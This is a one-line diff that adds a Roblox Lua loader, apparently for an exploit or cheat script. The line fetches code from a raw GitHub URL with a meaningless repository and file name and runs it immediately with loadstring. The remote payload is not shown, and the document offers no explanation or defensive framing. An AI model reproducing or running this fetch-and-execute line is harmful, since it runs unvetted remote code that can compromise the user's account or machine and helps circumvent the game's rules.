@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jeral1/Dkdkdkdj-hour-of-creation-/refs/heads/main/Hdjsjdjd"))()
